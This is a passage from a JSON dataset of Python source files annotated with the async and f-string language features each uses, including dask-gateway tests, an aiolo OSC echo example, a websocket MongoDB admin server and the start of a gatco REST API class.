address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(1)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            timeout = 5\n            while timeout > 0:\n                if cluster_obj.manager.stop_worker_state is not None:\n                    break\n                await asyncio.sleep(0.1)\n                timeout -= 0.1\n            else:\n                assert False, \"Operation timed out\"\n            assert cluster_obj.manager.stop_worker_state == {\"i\": 2}\n            await cluster.shutdown()\n@pytest.mark.asyncio\n@pytest.mark.parametrize(\"fail_stage\", [0, 1])\nasync def test_worker_fails_during_start(tmpdir, fail_stage):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = WorkerFailsDuringStart\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.WorkerFailsDuringStart.fail_stage = fail_stage\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(1)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            timeout = 5\n            while timeout > 0:\n                if cluster_obj.manager.stop_worker_state is not None:\n                    break\n                await asyncio.sleep(0.1)\n                timeout -= 0.1\n            else:\n                assert False, \"Operation timed out\"\n            res = {} if fail_stage == 0 else {\"i\": fail_stage - 1}\n            assert cluster_obj.manager.stop_worker_state == res\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_worker_fails_between_start_and_connect(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = WorkerFailsBetweenStartAndConnect\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.WorkerFailsBetweenStartAndConnect.worker_status_period = 0.1\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(1)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            timeout = 5\n            while timeout > 0:\n                if cluster_obj.manager.status == \"stopped\":\n                    break\n                await asyncio.sleep(0.1)\n                timeout -= 0.1\n            else:\n                assert False, \"Operation timed out\"\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_worker_fails_after_connect(tmpdir):\n    async with temp_gateway(\n        cluster_manager_class=WorkerFailsAfterConnect, temp_dir=str(tmpdir)\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(1)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            await asyncio.wait_for(cluster_obj.manager.worker_connected, 30)\n            worker = list(cluster_obj.manager.workers.values())[0]\n            await worker.close(1)\n            await asyncio.wait_for(cluster_obj.manager.stop_worker_called, 30)\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_successful_cluster(tmpdir):\n    async with temp_gateway(\n        cluster_manager_class=InProcessClusterManager, temp_dir=str(tmpdir)\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            clusters = await gateway.list_clusters()\n            assert clusters == []\n            cluster = await gateway.new_cluster()\n            clusters = await gateway.list_clusters()\n            assert len(clusters)\n            assert clusters[0].name == cluster.name\n            await cluster.scale(2)\n            with cluster.get_client(set_as_default=False) as client:\n                res = await client.submit(lambda x: x + 1, 1)\n                assert res == 2\n            await cluster.scale(1)\n            with cluster.get_client(set_as_default=False) as client:\n                res = await client.submit(lambda x: x + 1, 1)\n                assert res == 2\n            await cluster.shutdown()\nclass ClusterOptionsManager(InProcessClusterManager):\n    option_two = Float(config=True)\n    option_one_b = Integer(config=True)\n@pytest.mark.asyncio\nasync def test_cluster_manager_options(tmpdir):\n    async with temp_gateway(\n        cluster_manager_class=ClusterOptionsManager,\n        cluster_manager_options=options.Options(\n            options.Integer(\n                \"option_one\", default=1, min=1, max=4, target=\"option_one_b\"\n            ),\n            options.Select(\"option_two\", options=[(\"small\", 1.5), (\"large\", 15)]),\n        ),\n        temp_dir=str(tmpdir),\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            assert cluster_obj.manager.option_one_b == 1\n            assert cluster_obj.manager.option_two == 1.5\n            assert cluster_obj.options == {\"option_one\": 1, \"option_two\": \"small\"}\n            await cluster.shutdown()\n            cluster = await gateway.new_cluster(option_two=\"large\")\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            assert cluster_obj.manager.option_one_b == 1\n            assert cluster_obj.manager.option_two == 15\n            assert cluster_obj.options == {\"option_one\": 1, \"option_two\": \"large\"}\n            await cluster.shutdown()\n            opts = await gateway.cluster_options()\n            opts.option_one = 2\n            cluster = await gateway.new_cluster(opts, option_two=\"large\")\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            assert cluster_obj.manager.option_one_b == 2\n            assert cluster_obj.manager.option_two == 15\n            assert cluster_obj.options == {\"option_one\": 2, \"option_two\": \"large\"}\n            await cluster.shutdown()\n            with pytest.raises(TypeError):\n                await gateway.new_cluster(cluster_options=10)\n            with pytest.raises(ValueError) as exc:\n                await gateway.new_cluster(option_two=\"medium\")\n            assert \"option_two\" in str(exc.value)\n@pytest.mark.asyncio\nasync def test_cluster_manager_options_client_config(tmpdir, monkeypatch):\n    monkeypatch.setenv(\"TEST_OPTION_TWO\", \"large\")\n    async with temp_gateway(\n        cluster_manager_class=ClusterOptionsManager,\n        cluster_manager_options=options.Options(\n            options.Integer(\n                \"option_one\", default=1, min=1, max=4, target=\"option_one_b\"\n            ),\n            options.Select(\"option_two\", options=[(\"small\", 1.5), (\"large\", 15)]),\n        ),\n        temp_dir=str(tmpdir),\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            with dask.config.set(gateway__cluster__options={\"option_one\": 2}):\n                opts = await gateway.cluster_options()\n                assert opts.option_one == 2\n                assert opts.option_two == \"small\"\n                opts = await gateway.cluster_options(use_local_defaults=False)\n                assert opts.option_one == 1\n                assert opts.option_two == \"small\"\n            with dask.config.set(\n                gateway__cluster__options={\"option_two\": \"{TEST_OPTION_TWO}\"}\n            ):\n                opts = await gateway.cluster_options()\n                assert opts.option_one == 1\n                assert opts.option_two == \"large\"\n            with dask.config.set(\n                gateway__cluster__options={\n                    \"option_two\": \"{TEST_OPTION_TWO}\",\n                    \"option_one\": 3,\n                }\n            ):\n                cluster = await gateway.new_cluster(option_one=2)\n                cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n                assert cluster_obj.options == {\"option_one\": 2, \"option_two\": \"large\"}\n                await cluster.shutdown()\n                opts = await gateway.cluster_options()\n                opts.option_two = \"small\"\n                cluster = await gateway.new_cluster(opts)\n                cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n                assert cluster_obj.options == {\"option_one\": 3, \"option_two\": \"small\"}\n                await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_gateway_stop_clusters_on_shutdown(tmpdir):\n    async with temp_gateway(\n        cluster_manager_class=InProcessClusterManager, temp_dir=str(tmpdir)\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            cluster2 = await gateway.new_cluster()\n            await cluster2.shutdown()\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            cluster_obj2 = gateway_proc.db.cluster_from_name(cluster2.name)\n            assert cluster_obj.manager.scheduler is not None\n    for c in [cluster_obj, cluster_obj2]:\n        assert c.manager.scheduler is None\n        assert c.status >= ClusterStatus.STOPPED\n@pytest.mark.asyncio\nasync def test_gateway_resume_clusters_after_shutdown(tmpdir):\n    temp_dir = str(tmpdir)\n    db_url = \"sqlite:///%s\" % tmpdir.join(\"dask_gateway.sqlite\")\n    db_encrypt_keys = [Fernet.generate_key()]\n    async with temp_gateway(\n        cluster_manager_class=LocalTestingClusterManager,\n        temp_dir=temp_dir,\n        db_url=db_url,\n        db_encrypt_keys=db_encrypt_keys,\n        stop_clusters_on_shutdown=False,\n    ) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster1_name = await gateway.submit()\n            async with gateway.connect(cluster1_name) as c:\n                await c.scale(2)\n            cluster2_name = await gateway.submit()\n            async with gateway.connect(cluster2_name):\n                pass\n            async with gateway.new_cluster():\n                pass\n    active_clusters = {c.name: c for c in gateway_proc.db.active_clusters()}\n    assert active_clusters\n    worker = list(active_clusters[cluster1_name].workers.values())[0]\n    pid = worker.state[\"pid\"]\n    os.kill(pid, signal.SIGTERM)\n    pid = active_clusters[cluster2_name].state[\"pid\"]\n    os.kill(pid, signal.SIGTERM)\n    async with temp_gateway(\n        cluster_manager_class=LocalTestingClusterManager,\n        temp_dir=temp_dir,\n        db_url=db_url,\n        db_encrypt_keys=db_encrypt_keys,\n        stop_clusters_on_shutdown=False,\n        gateway_url=gateway_proc.gateway_urls.connect_url,\n        private_url=gateway_proc.private_urls.connect_url,\n        public_url=gateway_proc.public_urls.connect_url,\n        check_cluster_timeout=2,\n    ) as gateway_proc:\n        active_clusters = list(gateway_proc.db.active_clusters())\n        assert len(active_clusters) == 1\n        cluster = active_clusters[0]\n        assert cluster.name == cluster1_name\n        assert len(cluster.active_workers()) == 1\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            async with gateway.connect(\n                cluster1_name, shutdown_on_close=True\n            ) as cluster:\n                with cluster.get_client(set_as_default=False) as client:\n                    res = await client.submit(lambda x: x + 1, 1)\n                    assert res == 2\n@pytest.mark.asyncio\nasync def test_user_limits(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = InProcessClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.UserLimits.max_clusters = 1\n    config.UserLimits.max_cores = 3\n    config.InProcessClusterManager.scheduler_cores = 1\n    config.InProcessClusterManager.worker_cores = 2\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            with pytest.raises(ValueError) as exc:\n                await gateway.new_cluster()\n            assert \"user limit\" in str(exc.value)\n            with pytest.warns(GatewayWarning, match=\"user cores limit\"):\n                await cluster.scale(2)\n            await cluster.shutdown()\n            cluster = await gateway.new_cluster()\n            await cluster.shutdown()\nasync def wait_for_workers(cluster, atleast=None, exact=None, timeout=30):\n    timeout = time.time() + timeout\n    while time.time() < timeout:\n        workers = cluster.scheduler_info.get(\"workers\")\n        nworkers = len(workers)\n        if atleast is not None and nworkers >= atleast:\n            break\n        elif exact is not None and nworkers == exact:\n            break\n        await asyncio.sleep(0.25)\n    else:\n        assert False, \"scaling timed out\"\n@pytest.mark.asyncio\nasync def test_scaling(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = InProcessClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(5)\n            await wait_for_workers(cluster, atleast=3)\n            await cluster.scale(1)\n            await wait_for_workers(cluster, exact=1)\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_adaptive_scaling(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = LocalTestingClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.LocalTestingClusterManager.adaptive_period = 0.25\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            async def is_adaptive():\n                report = await gateway.get_cluster(cluster.name)\n                return report.adaptive\n            assert not await is_adaptive()\n            await cluster.adapt()\n            assert await is_adaptive()\n            with cluster.get_client(set_as_default=False) as client:\n                res = await client.submit(lambda x: x + 1, 1)\n                assert res == 2\n            await wait_for_workers(cluster, exact=0)\n            assert await is_adaptive()\n            await cluster.scale(1)\n            assert not await is_adaptive()\n            await cluster.adapt()\n            assert await is_adaptive()\n            await cluster.adapt(active=False)\n            assert not await is_adaptive()\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_idle_timeout(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = InProcessClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.InProcessClusterManager.idle_timeout = 2\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(2)\n            await wait_for_workers(cluster, atleast=1)\n            waited = 0\n            while await gateway.list_clusters():\n                await asyncio.sleep(0.25)\n                waited += 0.25\n                if waited >= 5:\n                    assert False, \"Failed to automatically shutdown in time\"\n            await cluster.shutdown()",
            "patterns": {
                "pep_468": [
                    [
                        117,
                        "super().__init__(*args, **kwargs)"
                    ],
                    [
                        124,
                        "super().stop_worker(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        33,
                        39,
                        "async generator",
                        "async def start_cluster(self):\n        self.running = True\n        yield self.state_1\n        await asyncio.sleep(self.pause_time)\n        yield self.state_2\n        await asyncio.sleep(self.pause_time)\n        yield self.state_3"
                    ],
                    [
                        48,
                        52,
                        "async generator",
                        "async def start_cluster(self):\n        for i in range(3):\n            if i == self.fail_stage:\n                raise ValueError(\"Oh No\")\n            yield {\"i\": i}"
                    ],
                    [
                        57,
                        59,
                        "async generator",
                        "async def start_cluster(self):\n        yield {\"foo\": \"bar\"}\n        self.status = \"failed\""
                    ],
                    [
                        66,
                        72,
                        "async generator",
                        "async def start_cluster(self):\n        loop = get_running_loop()\n        self.failed = loop.create_future()\n        self.stop_cluster_called = loop.create_future()\n        async for state in super().start_cluster():\n            yield state\n        self.task_pool.create_task(self.delay_fail_cluster())"
                    ],
                    [
                        86,
                        90,
                        "async generator",
                        "async def start_worker(self, worker_name, cluster_state):\n        for i in range(3):\n            yield {\"i\": i}\n            await asyncio.sleep(self.pause_time)\n        self.workers[worker_name] = None"
                    ],
                    [
                        99,
                        103,
                        "async generator",
                        "async def start_worker(self, worker_name, cluster_state):\n        for i in range(3):\n            if i == self.fail_stage:\n                raise ValueError(\"Oh No\")\n            yield {\"i\": i}"
                    ],
                    [
                        108,
                        110,
                        "async generator",
                        "async def start_worker(self, worker_name, cluster_state):\n        yield {\"foo\": \"bar\"}\n        self.status = \"failed\""
                    ],
                    [
                        70,
                        71,
                        "async for",
                        "async for state in super().start_cluster():\n            yield state"
                    ]
                ],
                "pep_498v": [
                    [
                        553,
                        553,
                        "%"
                    ],
                    [
                        148,
                        148,
                        "%"
                    ],
                    [
                        160,
                        160,
                        "%"
                    ]
                ]
            }
        },
        "173": {
            "file": "import asyncio\nfrom aiolo import Address, Midi, Server\nasync def main():\n    server = Server(port=12001)\n    server.start()\n    foo = server.route('/foo', [int, float, Midi])\n    ex = server.route('/exit')\n    address = Address(port=12001)\n    for i in range(5):\n        address.send(foo, i, float(i), Midi(i, i, i, i))\n    address.delay(1, ex)\n    subs = foo.sub() | ex.sub()\n    async for route, data in subs:\n        print(f'echo_server: {str(route.path)} received {data}')\n        if route == ex:\n            await subs.unsub()\n    server.stop()\nif __name__ == '__main__':\n    asyncio.get_event_loop().run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        13,
                        16,
                        "async for",
                        "async for route, data in subs:\n        print(f'echo_server: {str(route.path)} received {data}')\n        if route == ex:\n            await subs.unsub()"
                    ]
                ],
                "pep_498": [
                    [
                        14,
                        "        print(f'echo_server: {str(route.path)} received {data}')"
                    ]
                ]
            }
        },
        "174": {
            "file": "import ssl\nimport asyncio\nimport json\nimport logging\nimport websockets\nimport py_modz\nimport py_mongo\npy_modz.ck_unlock();\nWEB_SOCKET_CLIENTS = set()\nasync def register(websocket):\n\tWEB_SOCKET_CLIENTS.add(websocket)\nasync def unregister(websocket):\n\tWEB_SOCKET_CLIENTS.remove(websocket)\n\tawait websocket.close()\nasync def send_ws_packet(websocket, type, data):\n\twsPkt = {}\n\twsPkt['type'] = type\n\twsPkt['data'] = data\n\tjson_data = json.dumps(wsPkt)\n\tawait websocket.send(json_data)\nasync def validateBypassToken(jwt,wsid, websocket):\n\tif await py_mongo.GetBypassTokenRecord(wsid):\n\t\tif await py_modz.verifyJWT(wsid, jwt):\n\t\t\treturn True\t\n\t\telse:\n\t\t\tawait unregister(websocket)\n\t\t\treturn False\n\telse:\n\t\tawait unregister(websocket)\n\t\treturn False\nasync def consumer(websocket,path):\n\ttry:\n\t\tasync for message in websocket:\n\t\t\ttjo = json.loads(message)\n\t\t\tif tjo[\"type\"] == \"set-ws-id\":\n\t\t\t\twebsocket.wsid = tjo[\"data\"]\n\t\t\t\tawait send_ws_packet(websocket, 'python-svr-msg', 'wsid registered')\n\t\t\t\tawait send_ws_packet(websocket, 'ws-client-count', len(WEB_SOCKET_CLIENTS))\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tprint(\"Websocket Registered and Validated: Success!!!\")\n\t\t\telif tjo[\"type\"] == \"get-databases\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"get-collections\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"get-documents\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\telif tjo[\"type\"] == \"drop-database\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdrop_result = await py_mongo.dropDatabase(tjo['data'])\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"create-database\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tcreate_db_result = await py_mongo.createDatabase(tjo[\"data\"])\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"drop-collection\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdrop_col_result = await py_mongo.dropCollection(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data']['db'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"create-collection\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\t\t\t\n\t\t\t\t\tcreate_col_result = await py_mongo.createColleciton(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data']['db'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"insert-document\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tinsert_doc_result = await py_mongo.insertDocument(tjo['data']['db'],tjo['data']['col'],tjo['data']['doc'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\t\t\t\t\t\n\t\t\t\t\tawait send_ws_packet(websocket, 'inserted-document', insert_doc_result)\n\t\t\telif tjo[\"type\"] == \"update-document\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tupdate_doc_result = await py_mongo.updateDocument(tjo['data']['db'],tjo['data']['col'],tjo['data']['oid'],tjo['data']['values'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\t\t\tprint(\"Modified \"+str(update_doc_result.modified_count)+\" document(s)\")\n\t\t\telif tjo[\"type\"] == \"insert-many\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tinsert_many_result = await py_mongo.insertMany(tjo['data']['db'],tjo['data']['col'],tjo['data']['data'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\t\t\tprint(\"Added new Docs: \")\n\t\t\t\t\tprint(insert_many_result)\t\t\t\t\t\n\t\t\telse:\n\t\t\t\tprint(\"Operation not recognized.\")\n\texcept:\n\t\tprint('Something went horribly wrong!!!')\n\tfinally:\n\t\tif websocket in WEB_SOCKET_CLIENTS:\n\t\t\tawait unregister(websocket)\n\t\telif websocket.closed == True:\n\t\t\tprint('Websocket closed...')\n\t\t\tdel websocket \n\t\telse:\n\t\t\tpy_modz.dump(websocket)\t\nasync def handler(websocket, path):\n\tawait register(websocket)\n\tconsumer_task = asyncio.ensure_future(consumer(websocket,path)) \n\tdone, pending = await asyncio.wait([consumer_task], return_when=asyncio.FIRST_COMPLETED)\n\tfor task in pending:\n\t\ttask.cancel()\nssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nssl_context.load_cert_chain('/etc/letsencrypt/live/caos.pr0con.com/cert.pem','/etc/letsencrypt/live/caos.pr0con.com/privkey.pem')\nserver = websockets.serve(handler, 'caos.pr0con.com', 1600, ssl=ssl_context)\nasyncio.get_event_loop().run_until_complete(server)\nasyncio.get_event_loop().run_forever()",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        33,
                        93,
                        "async for",
                        "async for message in websocket:\n\t\t\ttjo = json.loads(message)\n\t\t\tif tjo[\"type\"] == \"set-ws-id\":\n\t\t\t\twebsocket.wsid = tjo[\"data\"]\n\t\t\t\tawait send_ws_packet(websocket, 'python-svr-msg', 'wsid registered')\n\t\t\t\tawait send_ws_packet(websocket, 'ws-client-count', len(WEB_SOCKET_CLIENTS))\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tprint(\"Websocket Registered and Validated: Success!!!\")\n\t\t\telif tjo[\"type\"] == \"get-databases\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"get-collections\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"get-documents\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\telif tjo[\"type\"] == \"drop-database\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdrop_result = await py_mongo.dropDatabase(tjo['data'])\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"create-database\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tcreate_db_result = await py_mongo.createDatabase(tjo[\"data\"])\n\t\t\t\t\tdatabases = await py_mongo.getDatabases()\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-databases', databases)\n\t\t\telif tjo[\"type\"] == \"drop-collection\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tdrop_col_result = await py_mongo.dropCollection(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data']['db'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"create-collection\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\t\t\t\n\t\t\t\t\tcreate_col_result = await py_mongo.createColleciton(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tcollections = await py_mongo.getCollections(tjo['data']['db'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-collections', collections)\n\t\t\telif tjo[\"type\"] == \"insert-document\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tinsert_doc_result = await py_mongo.insertDocument(tjo['data']['db'],tjo['data']['col'],tjo['data']['doc'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\t\t\t\t\t\n\t\t\t\t\tawait send_ws_packet(websocket, 'inserted-document', insert_doc_result)\n\t\t\telif tjo[\"type\"] == \"update-document\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tupdate_doc_result = await py_mongo.updateDocument(tjo['data']['db'],tjo['data']['col'],tjo['data']['oid'],tjo['data']['values'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\t\t\tprint(\"Modified \"+str(update_doc_result.modified_count)+\" document(s)\")\n\t\t\telif tjo[\"type\"] == \"insert-many\":\n\t\t\t\tif await validateBypassToken(tjo['jwt'], websocket.wsid, websocket):\n\t\t\t\t\tinsert_many_result = await py_mongo.insertMany(tjo['data']['db'],tjo['data']['col'],tjo['data']['data'])\n\t\t\t\t\tdocuments = await py_mongo.getDocuments(tjo['data']['db'],tjo['data']['col'])\n\t\t\t\t\tawait send_ws_packet(websocket, 'requested-documents', documents)\n\t\t\t\t\tprint(\"Added new Docs: \")\n\t\t\t\t\tprint(insert_many_result)\t\t\t\t\t\n\t\t\telse:\n\t\t\t\tprint(\"Operation not recognized.\")"
                    ]
                ]
            }
        },
        "175": {
            "file": "import asyncio\nfrom collections import defaultdict\nfrom functools import wraps\nimport math\nimport warnings\nimport ujson\nfrom bson.objectid import ObjectId\nfrom gatco.exceptions import GatcoException, ServerError\nfrom gatco.response import json, text, HTTPResponse\nfrom gatco.request import json_loads\nfrom gatco.views import HTTPMethodView\nfrom .helpers import upper_keys\nclass ProcessingException(GatcoException):\n    def __init__(self, message='', status_code=520):\n        super(ProcessingException, self).__init__(message, status_code)\n        self.status_code = status_code\n        self.message = message\nclass ModelView(HTTPMethodView):\n    def __init__(self, motor_db, *args, **kw):\n        super(ModelView, self).__init__(*args, **kw)\n        self.motor_db = motor_db\nclass API(ModelView):\n    def __init__(self, motor_db, collection_name=None, exclude_columns=None,\n                 include_columns=None, include_methods=None,\n                 validation_exceptions=None, results_per_page=10,\n                 max_results_per_page=100, post_form_preprocessor=None,\n                 preprocess=None, postprocess=None, primary_key=None, *args, **kw):\n        super(API, self).__init__(motor_db, *args, **kw)\n        self.include_methods = include_methods\n        self.primary_key = \"_id\"\n        self.collection_name = collection_name\n        self.postprocess = defaultdict(list)\n        self.preprocess = defaultdict(list)\n        self.postprocess.update(upper_keys(postprocess or {}))\n        self.preprocess.update(upper_keys(preprocess or {}))\n        for postprocess in 